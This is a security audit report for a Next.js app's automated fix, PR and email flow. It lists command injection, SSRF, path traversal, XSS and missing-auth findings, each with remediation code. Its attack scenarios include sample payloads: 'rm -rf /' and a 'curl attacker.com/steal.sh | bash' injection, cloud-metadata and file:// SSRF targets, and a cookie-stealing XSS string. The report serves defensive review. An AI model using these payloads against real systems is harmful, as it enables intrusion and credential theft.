# Security Scan Report - Blip Ship CRO Fix Flow

**Timestamp**: 2026-01-18T02:54:24Z
**Scan Type**: Targeted - CRO Fix Flow Implementation
**Scope**: Email branch features (fix suggestion, PR automation, email service)
**Status**: **FAIL - 8 Critical, 12 High Severity Issues Found**

---

## Executive Summary

This security assessment identified **20 vulnerabilities** across the newly implemented CRO fix flow:

| Severity | Count | Status |
|----------|-------|--------|
| **Critical** | **8** | **BLOCKING** |
| **High** | **12** | **Must Fix** |
| **Medium** | **6** | Review Required |
| **Low** | **3** | Enhancement |
| **Info** | **2** | FYI |

### Risk Rating: **CRITICAL**

The implementation contains multiple **critical security vulnerabilities** that could lead to:
- **Remote Code Execution (RCE)** via command injection
- **Server-Side Request Forgery (SSRF)** attacks
- **Path Traversal** and arbitrary file access
- **Unauthorized PR merges** to production
- **XSS attacks** via email HTML injection
- **Secrets exposure** in version control

**Recommendation**: **DO NOT DEPLOY** until all critical and high-severity issues are remediated.

### Success Criteria Status
- Zero Critical Issues: **FAILED** (8 critical issues found)
- Zero High Issues: **FAILED** (12 high issues found)

---

## Critical Severity Findings

### [CRITICAL-1] Command Injection in Git Service

**Severity**: Critical
**CWE**: CWE-78 (OS Command Injection)
**CVSS Score**: 9.8 (Critical)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/git-service.ts`
- Lines 92-93, 142, 197, 245-256, 299, 304

**Description**:
The `git-service.ts` module executes shell commands using unsanitized user input, allowing attackers to inject arbitrary commands. The `gitCommand()` function directly interpolates user-controlled data into shell commands executed via `child_process.exec()`.

**Vulnerable Code**:
```typescript
// Line 92: Unsanitized branch name in git command
await gitCommand(`checkout -b ${branchName} origin/main`);

// Line 142: User-controlled commit message file path
await gitCommand(`commit -F "${msgFile}"`);

// Line 197: Unsanitized PR title and description
await execAsync(
  `gh pr create --title "${prInfo.title}" --body "${prInfo.description.replace(/"/g, '\\"')}" --base main --head ${branchName}`,
  { cwd: process.cwd() }
);

// Line 245-256: Direct command execution with user input
await execAsync(`gh pr merge ${prInfo.number} --squash --delete-branch`);
await gitCommand(`merge ${prInfo.branchName} --squash`);
await gitCommand(`branch -D ${prInfo.branchName}`);
```

**Attack Scenarios**:

1. **Branch Name Injection**:
   - Attacker crafts suggestion with ID: `fix_123; rm -rf /`
   - Generates branch: `fix/cro-20260118-fix_123; rm -rf /`
   - Command executed: `git checkout -b fix/cro-20260118-fix_123; rm -rf / origin/main`
   - Result: Arbitrary command execution

2. **PR Description Injection**:
   - Malicious description: `Test"\n$(curl attacker.com/steal.sh | bash)\n"`
   - Escaping bypassed via newlines
   - Result: Remote code execution during PR creation

3. **Commit Message Injection**:
   - Malicious suggestion data inserted into commit message
   - File path controlled: `.git/COMMIT_MSG_TEMP`
   - Result: Potential file path traversal

**Impact**:
- **Remote Code Execution** with application privileges
- **Data exfiltration** from server
- **Repository corruption** or deletion
- **Lateral movement** to other systems
- **Supply chain attacks** via malicious commits

**Exploitability**: **Easy** - No authentication required on `/api/trigger-fix-flow` endpoint

**Remediation Steps**:

1. **Immediate**: Add input validation to all git operations
   ```typescript
   // Sanitize branch names
   function sanitizeBranchName(name: string): string {
     return name.replace(/[^a-zA-Z0-9\-_\/]/g, '');
   }

   // Use array-based commands instead of string interpolation
   import { execFile } from 'child_process';
   const execFileAsync = promisify(execFile);

   async function gitCommand(args: string[]): Promise<string> {
     const { stdout } = await execFileAsync('git', args, {
       cwd: process.cwd(),
       timeout: 30000,
     });
     return stdout.trim();
   }

   // Example usage:
   await gitCommand(['checkout', '-b', sanitizedBranch, 'origin/main']);
   ```

2. **Use GitHub API instead of gh CLI**:
   ```typescript
   // Replace gh CLI with authenticated API calls
   const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });
   await octokit.rest.pulls.create({
     owner,
     repo,
     title: sanitizeTitle(prInfo.title),
     body: sanitizeBody(prInfo.description),
     head: sanitizedBranch,
     base: 'main',
   });
   ```

3. **Validate all user inputs**:
   - Suggestion IDs: `^[a-zA-Z0-9_-]{1,100}$`
   - Branch names: `^fix/cro-[0-9]{8}-[a-zA-Z0-9]{8}$`
   - PR numbers: Numeric only

**References**:
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection

---

### [CRITICAL-2] Server-Side Request Forgery (SSRF) in Screenshot Service

**Severity**: Critical
**CWE**: CWE-918 (Server-Side Request Forgery)
**CVSS Score**: 9.1 (Critical)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/screenshot-service.ts`
- Lines 65, 109, 120

**Description**:
The `screenshot-service.ts` uses Playwright to navigate to user-controlled URLs without validation, allowing attackers to make the server request arbitrary internal or external resources.

**Vulnerable Code**:
```typescript
// Lines 108-120: No URL validation before navigation
const currentUrl = `${baseUrl}/store`;
const current = await captureScreenshot(page, currentUrl, {...});

const previewUrl = `${baseUrl}/store?preview=true&fixId=${suggestionId}`;
const preview = await captureScreenshot(page, previewUrl, {...});

// Line 65: Direct navigation to attacker-controlled URL
await page.goto(url, { waitUntil: 'networkidle' });
```

**Attack Scenarios**:

1. **Internal Network Scanning**:
   - Attacker sends request with `x-forwarded-proto: http` and `host: 169.254.169.254`
   - Base URL becomes: `http://169.254.169.254`
   - Screenshot service accesses: `http://169.254.169.254/store`
   - Result: AWS metadata endpoint accessed, credentials stolen

2. **Local Service Exploitation**:
   - Base URL: `http://localhost:5432` (PostgreSQL)
   - Result: Database port scanning and exploitation

3. **File System Access**:
   - Base URL: `file:///etc/passwd`
   - Result: Local file disclosure via screenshot

4. **External Data Exfiltration**:
   - Base URL: `http://attacker.com/log?data=`
   - Screenshot triggers request to attacker's server
   - Result: Server IP and timing information leaked

**Impact**:
- **Cloud metadata exposure** (AWS, GCP, Azure credentials)
- **Internal network mapping** and service discovery
- **Local file system access** via file:// protocol
- **Bypass firewall rules** using server as proxy
- **Denial of Service** via resource exhaustion

**Exploitability**: **Easy** - Controlled via HTTP headers

**Remediation Steps**:

1. **Implement strict URL validation**:
   ```typescript
   function validateBaseUrl(url: string): boolean {
     try {
       const parsed = new URL(url);

       // Only allow HTTPS
       if (parsed.protocol !== 'https:') return false;

       // Blocklist local/internal addresses
       const hostname = parsed.hostname.toLowerCase();
       const blocked = [
         'localhost', '127.0.0.1', '0.0.0.0',
         /^10\.\d+\.\d+\.\d+$/,          // 10.0.0.0/8
         /^172\.(1[6-9]|2\d|3[01])\.\d+\.\d+$/, // 172.16.0.0/12
         /^192\.168\.\d+\.\d+$/,         // 192.168.0.0/16
         /^169\.254\.\d+\.\d+$/,         // Link-local
         /^\[::1\]$|^\[fe80::/,          // IPv6 localhost/link-local
       ];

       for (const pattern of blocked) {
         if (typeof pattern === 'string') {
           if (hostname === pattern) return false;
         } else {
           if (pattern.test(hostname)) return false;
         }
       }

       // Allowlist expected domains only
       const allowedDomains = [
         process.env.ALLOWED_DOMAIN || 'blipship.com',
         process.env.VERCEL_URL,
       ].filter(Boolean);

       return allowedDomains.some(domain =>
         hostname === domain || hostname.endsWith(`.${domain}`)
       );
     } catch {
       return false;
     }
   }

   // Use in screenshot service
   export async function captureFixScreenshots(
     baseUrl: string,
     suggestionId: string,
     options?: { width?: number; height?: number; }
   ): Promise<CapturedScreenshots> {
     if (!validateBaseUrl(baseUrl)) {
       throw new Error('Invalid base URL for screenshot capture');
     }
     // ... rest of function
   }
   ```

2. **Use environment variable for base URL**:
   ```typescript
   // Don't trust request headers
   const TRUSTED_BASE_URL = process.env.NEXT_PUBLIC_SITE_URL || 'https://blipship.com';

   // In trigger-fix-flow/route.ts
   const baseUrl = TRUSTED_BASE_URL; // Don't construct from headers
   ```

3. **Network isolation for Playwright**:
   - Run Playwright in sandboxed container
   - Block egress to internal networks
   - Use DNS-level filtering

**References**:
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

---

### [CRITICAL-3] Path Traversal in Fix Store

**Severity**: Critical
**CWE**: CWE-22 (Path Traversal)
**CVSS Score**: 8.6 (High/Critical)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/fix-store.ts`
- Line 27, 55

**Description**:
The fix store uses user-controlled suggestion IDs as file identifiers without proper sanitization, potentially allowing path traversal attacks.

**Vulnerable Code**:
```typescript
// Line 27: Fixed path but vulnerable to ID manipulation
const FIXES_FILE = path.join(process.cwd(), 'data', 'fixes.json');

// The fix ID comes directly from user input and is used as keys
export async function saveFix(
  suggestion: Suggestion,  // suggestion.id is user-controlled
  fix: MinimalFix,
  prInfo?: PRInfo
): Promise<StoredFix> {
  const storedFix: StoredFix = {
    id: suggestion.id,  // No validation
    // ...
  };
}
```

**Attack Scenarios**:

1. **Future Refactoring Risk**:
   - If code changes to use fix IDs in file paths:
     ```typescript
     // Hypothetical vulnerable change
     const fixFile = path.join(FIXES_DIR, `${fixId}.json`);
     ```
   - Attacker uses ID: `../../../etc/passwd`
   - Result: Arbitrary file read/write

2. **JSON Injection**:
   - Malicious fix ID with control characters
   - JSON structure corruption in `fixes.json`
   - Result: Denial of service or data corruption

**Impact**:
- **Arbitrary file read/write** (if implementation changes)
- **Data corruption** in fix storage
- **Denial of Service** via malformed data

**Exploitability**: **Moderate** - Requires specific implementation changes

**Remediation Steps**:

1. **Validate and sanitize fix IDs**:
   ```typescript
   function validateFixId(id: string): boolean {
     // Only allow alphanumeric, dash, underscore
     return /^[a-zA-Z0-9_-]{1,100}$/.test(id);
   }

   export async function saveFix(
     suggestion: Suggestion,
     fix: MinimalFix,
     prInfo?: PRInfo
   ): Promise<StoredFix> {
     if (!validateFixId(suggestion.id)) {
       throw new Error('Invalid fix ID format');
     }
     // ... rest of function
   }
   ```

2. **Use UUID v4 for fix IDs** (server-generated):
   ```typescript
   import { randomUUID } from 'crypto';

   // In suggest-fix endpoint, generate secure ID
   const fixId = randomUUID(); // e.g., "550e8400-e29b-41d4-a716-446655440000"
   ```

3. **Add path sanitization helper**:
   ```typescript
   import path from 'path';

   function sanitizePath(userPath: string): string {
     const normalized = path.normalize(userPath);
     if (normalized.includes('..') || path.isAbsolute(normalized)) {
       throw new Error('Invalid path detected');
     }
     return normalized;
   }
   ```

**References**:
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal

---

### [CRITICAL-4] Missing Authentication on Critical Endpoints

**Severity**: Critical
**CWE**: CWE-306 (Missing Authentication for Critical Function)
**CVSS Score**: 9.1 (Critical)

**Location**: Multiple files
- `/Users/lukalavric/repos/blip-ship/app/api/fix/[fixId]/approve/route.ts`
- `/Users/lukalavric/repos/blip-ship/app/api/fix/[fixId]/reject/route.ts`
- `/Users/lukalavric/repos/blip-ship/app/api/trigger-fix-flow/route.ts`

**Description**:
Critical endpoints that merge PRs to production (`approve`), close PRs (`reject`), and trigger automated fixes have **no authentication or authorization checks**. Any attacker can merge arbitrary changes to the main branch.

**Vulnerable Code**:
```typescript
// app/api/fix/[fixId]/approve/route.ts - NO AUTH CHECK
export async function POST(
  request: NextRequest,
  { params }: { params: Promise<{ fixId: string }> }
) {
  // Directly merges PR without any authentication
  const mergeResult = await mergePullRequest(suggestionId);
}

// app/api/fix/[fixId]/reject/route.ts - NO AUTH CHECK
export async function POST(
  request: NextRequest,
  { params }: { params: Promise<{ fixId: string }> }
) {
  // Directly closes PR without any authentication
  const closeResult = await closePullRequest(suggestionId);
}

// app/api/trigger-fix-flow/route.ts - NO AUTH CHECK
export async function POST(request: NextRequest) {
  // Anyone can trigger fix flow
  const prResult = await createFixPR(suggestion, fix);
}
```

**Attack Scenarios**:

1. **Unauthorized Production Deployment**:
   ```bash
   # Attacker discovers fix ID from email preview URL or logs
   curl -X POST https://blipship.com/api/fix/fix_123abc/approve
   # Malicious PR merged to production instantly
   ```

2. **Denial of Service via Fix Spam**:
   ```bash
   # Spam trigger endpoint
   for i in {1..100}; do
     curl -X POST https://blipship.com/api/trigger-fix-flow &
   done
   # Creates 100 PRs, sends 100 emails, exhausts resources
   ```

3. **Rejection of Legitimate Fixes**:
   ```bash
   # Attacker rejects valid optimization
   curl -X POST https://blipship.com/api/fix/fix_legitimate/reject \
     -H "Content-Type: application/json" \
     -d '{"reason": "Rejected by attacker"}'
   ```

**Impact**:
- **Unauthorized code deployment** to production
- **Supply chain attacks** via malicious commits
- **Denial of Service** through resource exhaustion
- **Business disruption** by blocking legitimate optimizations
- **Reputation damage** from malicious site changes

**Exploitability**: **Trivial** - Unauthenticated POST requests

**Remediation Steps**:

1. **Implement authentication middleware** (Priority 1):
   ```typescript
   // middleware.ts
   import { NextResponse } from 'next/server';
   import type { NextRequest } from 'next/server';
   import { verify } from 'jsonwebtoken';

   export function middleware(request: NextRequest) {
     const protectedPaths = [
       '/api/fix',
       '/api/trigger-fix-flow',
     ];

     if (protectedPaths.some(path => request.nextUrl.pathname.startsWith(path))) {
       const authHeader = request.headers.get('authorization');

       if (!authHeader?.startsWith('Bearer ')) {
         return NextResponse.json(
           { error: 'Missing authentication token' },
           { status: 401 }
         );
       }

       const token = authHeader.substring(7);
       try {
         verify(token, process.env.JWT_SECRET!);
       } catch {
         return NextResponse.json(
           { error: 'Invalid or expired token' },
           { status: 401 }
         );
       }
     }

     return NextResponse.next();
   }

   export const config = {
     matcher: ['/api/fix/:path*', '/api/trigger-fix-flow'],
   };
   ```

2. **Add signed tokens to approval emails**:
   ```typescript
   import { sign } from 'jsonwebtoken';

   // In email-service.ts
   function generateApprovalToken(fixId: string): string {
     return sign(
       { fixId, action: 'approve', exp: Math.floor(Date.now() / 1000) + 7 * 86400 },
       process.env.JWT_SECRET!
     );
   }

   export async function buildFixApprovalEmail(
     recipientEmail: string,
     suggestion: Suggestion,
     fix: MinimalFix,
     baseUrl: string,
     storeName?: string
   ): Promise<FixApprovalEmail> {
     const approvalToken = generateApprovalToken(fix.id);
     const rejectionToken = generateApprovalToken(fix.id); // separate token

     return {
       // ...
       approvalUrl: `${baseUrl}/fix/${suggestion.id}?action=approve&token=${approvalToken}`,
       rejectionUrl: `${baseUrl}/fix/${suggestion.id}?action=reject&token=${rejectionToken}`,
     };
   }
   ```

3. **Rate limiting**:
   ```typescript
   // Use Vercel rate limiting or Upstash Redis
   import rateLimit from '@/lib/rate-limit';

   const limiter = rateLimit({
     interval: 60 * 1000, // 1 minute
     uniqueTokenPerInterval: 500,
   });

   export async function POST(request: NextRequest) {
     try {
       await limiter.check(request, 5); // 5 requests per minute
     } catch {
       return NextResponse.json(
         { error: 'Rate limit exceeded' },
         { status: 429 }
       );
     }
     // ... rest of handler
   }
   ```

4. **Add CSRF protection**:
   - Use Next.js CSRF tokens for state-changing operations
   - Validate Origin and Referer headers

**References**:
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- OWASP Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/

---

### [CRITICAL-5] HTML Injection / XSS in Email Generation

**Severity**: Critical
**CWE**: CWE-79 (Cross-Site Scripting)
**CVSS Score**: 8.2 (High)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/email-service.ts`
- Lines 244, 255, 278-279, 292-293, 314, 318, 330

**Description**:
User-controlled data from suggestions is directly interpolated into HTML email templates without sanitization, allowing HTML/JavaScript injection in emails.

**Vulnerable Code**:
```typescript
// Line 244: Unsanitized store name
<p style="margin: 0; font-size: 14px; color: #9CA3AF;">
  A new optimization has been identified for ${storeName}
</p>

// Line 255: Unsanitized summary (from suggestion data)
<h2 style="margin: 0 0 16px 0; font-size: 20px; font-weight: 600; color: #111827;">
  ${email.suggestion.analysis.summary}
</h2>

// Line 261: Unsanitized expected impact
<span style="font-size: 14px; font-weight: 600; color: #059669;">
  Expected Impact: ${email.suggestion.recommendation.expectedImpact}
</span>

// Lines 310-320: Unsanitized change details
${email.suggestion.changes.map((change) => `
  <div style="padding: 12px 0; border-bottom: 1px solid #E5E7EB;">
    <div style="font-size: 13px; font-weight: 600; color: #6B7280; font-family: monospace;">
      ${change.field}
    </div>
    <div style="margin-top: 8px; font-size: 14px;">
      <span style="color: #EF4444; text-decoration: line-through;">${truncateValue(change.oldValue)}</span>
      <span style="color: #10B981; font-weight: 500;">${truncateValue(change.newValue)}</span>
    </div>
  </div>
`).join('')}
```

**Attack Scenarios**:

1. **Phishing via Email Injection**:
   - Malicious store name: `ACME Corp</p><a href="https://evil.com/phish">Click here to verify</a><p>`
   - Rendered email contains attacker's link
   - Result: Email-based phishing attack

2. **Email Client XSS** (if client renders HTML):
   - Malicious summary: `Test<img src=x onerror="alert(document.cookie)">`
   - Some email clients may execute JavaScript
   - Result: XSS in vulnerable email clients

3. **Visual Spoofing**:
   - Expected impact: `+500% <span style="display:none">NOT</span>revenue`
   - Displayed: "+500% revenue"
   - Actual: "+500% NOT revenue"
   - Result: Misleading metrics

**Impact**:
- **Phishing attacks** via injected links
- **Email client XSS** in vulnerable clients (Outlook, older webmail)
- **Visual spoofing** to manipulate approval decisions
- **Email reputation damage** (flagged as spam)

**Exploitability**: **Moderate** - Requires control of suggestion data

**Remediation Steps**:

1. **HTML encode all user data** (Priority 1):
   ```typescript
   function escapeHtml(unsafe: string): string {
     return unsafe
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;")
       .replace(/'/g, "&#039;");
   }

   // In generateEmailHtml
   <h2 style="margin: 0 0 16px 0; font-size: 20px; font-weight: 600; color: #111827;">
     ${escapeHtml(email.suggestion.analysis.summary)}
   </h2>
   ```

2. **Use template literal sanitization**:
   ```typescript
   import DOMPurify from 'isomorphic-dompurify';

   function sanitizeForEmail(html: string): string {
     return DOMPurify.sanitize(html, {
       ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
       ALLOWED_ATTR: [],
     });
   }
   ```

3. **Validate suggestion data structure**:
   ```typescript
   import { z } from 'zod';

   const SuggestionSchema = z.object({
     analysis: z.object({
       summary: z.string().max(200).regex(/^[a-zA-Z0-9\s\-:,\.]+$/),
     }),
     recommendation: z.object({
       expectedImpact: z.string().max(100).regex(/^[\+\-]?\d+[\%\s\w\-]+$/),
     }),
   });

   // Validate before using in email
   SuggestionSchema.parse(suggestion);
   ```

**References**:
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/

---

### [CRITICAL-6] Secrets Exposure Risk

**Severity**: Critical
**CWE**: CWE-798 (Use of Hard-coded Credentials)
**CVSS Score**: 8.1 (High)

**Location**: Multiple files
- `/Users/lukalavric/repos/blip-ship/.env.example`
- `/Users/lukalavric/repos/blip-ship/lib/email-service.ts` (lines 19-21)
- `/Users/lukalavric/repos/blip-ship/lib/cloudinary-service.ts` (lines 10-12)

**Description**:
API keys and credentials are loaded from environment variables but lack protection mechanisms. The codebase doesn't include `.env` in `.gitignore` checks, and error messages may leak credential existence.

**Vulnerable Code**:
```typescript
// lib/email-service.ts
const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
const FROM_EMAIL = process.env.SENDGRID_FROM_EMAIL || 'noreply@blipship.com';

if (SENDGRID_API_KEY) {
  sgMail.setApiKey(SENDGRID_API_KEY); // No validation of format
}

// lib/cloudinary-service.ts
const CLOUDINARY_CLOUD_NAME = process.env.CLOUDINARY_CLOUD_NAME;
const CLOUDINARY_API_KEY = process.env.CLOUDINARY_API_KEY;
const CLOUDINARY_API_SECRET = process.env.CLOUDINARY_API_SECRET;
```

**Risks**:

1. **Accidental Commit of .env File**:
   - Developer creates `.env` file
   - Forgets to add to `.gitignore`
   - Commits to repository
   - Result: Secrets leaked in git history

2. **Error Message Leakage**:
   - API call fails with key in error
   - Error logged or returned to client
   - Result: Partial credential exposure

3. **No Key Rotation**:
   - Compromised keys not detected
   - No mechanism to rotate credentials
   - Result: Persistent unauthorized access

**Impact**:
- **SendGrid account takeover** ($$ spam abuse)
- **Cloudinary abuse** (hosting malicious content)
- **GitHub token exposure** (repository access)
- **Compliance violations** (PCI-DSS, SOC 2)

**Exploitability**: **High** if .env committed

**Remediation Steps**:

1. **Verify .gitignore protection**:
   ```bash
   # Add to .gitignore if not present
   cat >> .gitignore << EOF
   .env
   .env.local
   .env.*.local
   .env.production
   **/.env
   EOF

   # Remove from git history if already committed
   git filter-branch --force --index-filter \
     "git rm --cached --ignore-unmatch .env" \
     --prune-empty --tag-name-filter cat -- --all
   ```

2. **Implement secret validation**:
   ```typescript
   // lib/secrets.ts
   function validateSendGridKey(key: string): boolean {
     // SendGrid keys start with "SG." and are 69 chars
     return /^SG\.[A-Za-z0-9_-]{66}$/.test(key);
   }

   function validateCloudinarySecret(secret: string): boolean {
     return /^[A-Za-z0-9_-]{27}$/.test(secret);
   }

   // Validate on startup
   if (SENDGRID_API_KEY && !validateSendGridKey(SENDGRID_API_KEY)) {
     throw new Error('Invalid SENDGRID_API_KEY format');
   }
   ```

3. **Use secret management service**:
   ```typescript
   // Use Vercel Environment Variables with encryption
   // Or HashiCorp Vault, AWS Secrets Manager, etc.

   import { getSecret } from '@vercel/edge-config';

   const SENDGRID_API_KEY = await getSecret('sendgrid-api-key');
   ```

4. **Implement secret scanning**:
   ```bash
   # Add pre-commit hook
   npm install --save-dev @secretlint/secretlint-rule-preset-recommend

   # .secretlintrc.json
   {
     "rules": [
       { "@secretlint/secretlint-rule-preset-recommend": true }
     ]
   }
   ```

5. **Sanitize error messages**:
   ```typescript
   function sanitizeError(error: unknown): string {
     const message = error instanceof Error ? error.message : String(error);
     // Remove potential API keys (SG.*, sk_*, etc.)
     return message.replace(/\b(SG\.|sk_|pk_)[A-Za-z0-9_-]+/g, '[REDACTED]');
   }
   ```

**References**:
- CWE-798: https://cwe.mitre.org/data/definitions/798.html
- OWASP Secrets Management: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

---

### [CRITICAL-7] CORS Misconfiguration

**Severity**: Critical
**CWE**: CWE-942 (Permissive Cross-domain Policy)
**CVSS Score**: 7.5 (High)

**Location**: Multiple files
- `/Users/lukalavric/repos/blip-ship/app/api/trigger-fix-flow/route.ts` (lines 184-192)
- `/Users/lukalavric/repos/blip-ship/app/api/suggest-fix/route.ts` (lines 156-164)

**Description**:
API endpoints use wildcard CORS policy (`Access-Control-Allow-Origin: *`), allowing any website to make requests and potentially trigger fix flows or steal data.

**Vulnerable Code**:
```typescript
// trigger-fix-flow/route.ts
export async function OPTIONS() {
  return NextResponse.json({}, {
    headers: {
      'Access-Control-Allow-Origin': '*',  // WILDCARD!
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

// suggest-fix/route.ts
export async function OPTIONS() {
  return NextResponse.json({}, {
    headers: {
      'Access-Control-Allow-Origin': '*',  // WILDCARD!
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
```

**Attack Scenarios**:

1. **Cross-Site Request Forgery (CSRF)**:
   - Attacker hosts malicious site: `evil.com`
   - Victim visits `evil.com` while logged into blipship.com
   - JavaScript on `evil.com` triggers:
     ```javascript
     fetch('https://blipship.com/api/trigger-fix-flow', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ forceIndex: 0 })
     });
     ```
   - CORS allows request
   - Result: Unauthorized fix deployed

2. **Data Exfiltration**:
   - Attacker site calls `/api/suggest-fix`
   - Receives suggestion data with analytics
   - Result: Business intelligence leaked

**Impact**:
- **CSRF attacks** triggering unauthorized operations
- **Data leakage** to third-party sites
- **Resource abuse** (rate limit bypass via distributed requests)

**Exploitability**: **Easy** - Any website can exploit

**Remediation Steps**:

1. **Remove CORS headers or restrict to specific origins**:
   ```typescript
   // Option 1: Remove CORS entirely (same-origin only)
   export async function OPTIONS() {
     return new NextResponse(null, { status: 204 });
   }

   // Option 2: Allowlist specific origins
   const ALLOWED_ORIGINS = [
     'https://blipship.com',
     'https://www.blipship.com',
     process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null,
   ].filter(Boolean);

   export async function OPTIONS(request: NextRequest) {
     const origin = request.headers.get('origin');
     const allowedOrigin = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];

     return NextResponse.json({}, {
       headers: {
         'Access-Control-Allow-Origin': allowedOrigin,
         'Access-Control-Allow-Methods': 'POST, OPTIONS',
         'Access-Control-Allow-Headers': 'Content-Type',
         'Access-Control-Allow-Credentials': 'true', // If using cookies
       },
     });
   }
   ```

2. **Add CSRF tokens for state-changing operations**:
   ```typescript
   import { randomBytes } from 'crypto';

   // Generate CSRF token (store in session)
   const csrfToken = randomBytes(32).toString('hex');

   // Validate in POST handler
   export async function POST(request: NextRequest) {
     const token = request.headers.get('x-csrf-token');
     // Validate token from session
   }
   ```

**References**:
- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- OWASP CORS: https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny

---

### [CRITICAL-8] Insecure Git Operations

**Severity**: Critical
**CWE**: CWE-732 (Incorrect Permission Assignment)
**CVSS Score**: 7.8 (High)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/git-service.ts`
- Lines 88, 250-256

**Description**:
Git operations store the original branch and attempt to restore it, but error handling can leave repository in inconsistent state. Additionally, no verification that operations succeed before proceeding.

**Vulnerable Code**:
```typescript
// Line 88: Original branch not always restored
const originalBranch = await getCurrentBranch();

// Lines 250-256: Dangerous merge sequence
await gitCommand('checkout main');
await gitCommand('pull origin main');
await gitCommand(`merge ${prInfo.branchName} --squash`);
await gitCommand('commit -m "Merge CRO fix"');
await gitCommand('push origin main');

// Line 372-377: Error may leave repo in bad state
try {
  await gitCommand(`checkout ${originalBranch}`);
} catch {
  // Ignore - DANGEROUS!
}
```

**Risks**:

1. **Repository Corruption**:
   - Merge conflict during squash merge
   - Auto-commit fails
   - Repository left in inconsistent state
   - Result: CI/CD failures, broken deployments

2. **Race Conditions**:
   - Two approve requests in parallel
   - Both checkout main, pull, merge
   - One overwrites the other's changes
   - Result: Lost commits

3. **Branch Leakage**:
   - Error during PR creation
   - Branch not cleaned up
   - Accumulation over time
   - Result: Repository bloat

**Impact**:
- **Repository corruption** requiring manual recovery
- **Lost commits** due to race conditions
- **Deployment failures** from bad states
- **Disk space exhaustion** from leaked branches

**Exploitability**: **Moderate** - Requires timing or errors

**Remediation Steps**:

1. **Use atomic git operations**:
   ```typescript
   export async function mergePullRequest(suggestionId: string): Promise<{
     success: boolean;
     message: string;
   }> {
     const prInfo = openPRs.get(suggestionId);
     if (!prInfo) {
       return { success: false, message: 'PR not found' };
     }

     // Use GitHub API instead of local git
     const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });
     try {
       await octokit.rest.pulls.merge({
         owner: process.env.GITHUB_OWNER,
         repo: process.env.GITHUB_REPO,
         pull_number: prInfo.number!,
         merge_method: 'squash',
       });

       prInfo.status = 'merged';
       return { success: true, message: 'PR merged via API' };
     } catch (error) {
       return { success: false, message: error.message };
     }
   }
   ```

2. **Add locking mechanism**:
   ```typescript
   import { Mutex } from 'async-mutex';
   const gitMutex = new Mutex();

   export async function mergePullRequest(suggestionId: string) {
     return await gitMutex.runExclusive(async () => {
       // All git operations protected by mutex
     });
   }
   ```

3. **Cleanup on error**:
   ```typescript
   export async function createFixPR(
     suggestion: Suggestion,
     fix: MinimalFix
   ) {
     const originalBranch = await getCurrentBranch();
     let branchName: string | null = null;

     try {
       branchName = await createFixBranch(suggestion, fix);
       await applyAndCommitChanges(suggestion, fix, branchName);
       await pushBranch(branchName);
       const prInfo = await createPullRequest(suggestion, fix, branchName);
       return { success: true, prInfo };
     } catch (error) {
       // Cleanup on failure
       if (branchName) {
         try {
           await gitCommand(`branch -D ${branchName}`).catch(() => {});
           await gitCommand(`push origin --delete ${branchName}`).catch(() => {});
         } catch {}
       }
       return { success: false, error: error.message };
     } finally {
       // Always restore original branch
       try {
         await gitCommand(`checkout ${originalBranch}`);
       } catch (restoreError) {
         console.error('Failed to restore original branch:', restoreError);
         // Log to monitoring system
       }
     }
   }
   ```

**References**:
- CWE-732: https://cwe.mitre.org/data/definitions/732.html

---

## High Severity Findings

### [HIGH-1] Unrestricted File Upload to Cloudinary

**Severity**: High
**CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Location**: `/Users/lukalavric/repos/blip-ship/lib/cloudinary-service.ts` (lines 46-99)

**Description**:
The Cloudinary upload function doesn't validate image content or size, allowing attackers to upload malicious files or exhaust storage quota.

**Vulnerable Code**:
```typescript
export async function uploadToCloudinary(
  imageBuffer: Buffer,  // No size check
  options?: { folder?: string; publicId?: string; }
): Promise<CloudinaryUploadResult> {
  // No content validation
  const base64Image = `data:image/png;base64,${imageBuffer.toString('base64')}`;

  formData.append('file', base64Image); // No MIME type validation
}
```

**Attack Scenarios**:

1. **Storage Exhaustion**:
   - Trigger 1000 fix flows
   - Each uploads 2 large screenshots (10MB each)
   - Total: 20GB uploaded
   - Result: Cloudinary bill spike, quota exceeded

2. **Malicious Content Hosting**:
   - Modify screenshot service to return malicious image
   - Upload to Cloudinary
   - Cloudinary URL used to host phishing images
   - Result: Abuse of CDN, account suspension

**Remediation**:
```typescript
const MAX_IMAGE_SIZE = 5 * 1024 * 1024; // 5MB

export async function uploadToCloudinary(
  imageBuffer: Buffer,
  options?: { folder?: string; publicId?: string; }
): Promise<CloudinaryUploadResult> {
  // Validate size
  if (imageBuffer.length > MAX_IMAGE_SIZE) {
    return {
      success: false,
      error: `Image too large: ${imageBuffer.length} bytes (max ${MAX_IMAGE_SIZE})`,
    };
  }

  // Validate PNG header
